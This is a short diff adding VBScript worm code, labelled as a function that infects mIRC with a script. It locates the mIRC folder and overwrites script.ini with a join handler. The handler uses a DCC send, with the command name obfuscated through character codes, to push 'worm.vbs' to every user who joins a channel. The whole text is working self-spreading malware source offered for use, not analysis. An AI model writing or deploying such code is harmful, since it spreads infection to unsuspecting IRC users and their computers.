@@ -1,0 +1,25 @@
+This function will infect mirc whit a simple script
+_______________________________________________________________________
+¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+Function Mirc(Path)
+On Error Resume Next
+Set fso = CreateObject("scripting.filesystemobject")
+Set ws = CreateObject("wscript.shell")
+If Path = "" Then
+If fso.fileexists("c:\mirc\mirc.ini") Then Path = "c:\mirc"
+If fso.fileexists("c:\mirc32\mirc.ini") Then Path = "c:\mirc32"
+PfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
+If fso.fileexists(PfDir & "\mirc\mirc.ini") Then Path = PfDir & "\mirc"
+End If
+If Path <> "" Then
+Set Script = fso.CreateTextFile(Path & "\script.ini", True)
+Script.writeline "[script]"
+Script.writeline "n0=on 1:JOIN:#:{"
+Script.writeline "n1=  /if ( $nick == $me ) { halt }"
+Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick c:\windows\worm.vbs"
+Script.writeline "n3=}"
+Script.Close
+End If
+End Function
+_______________________________________________________________________
+¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
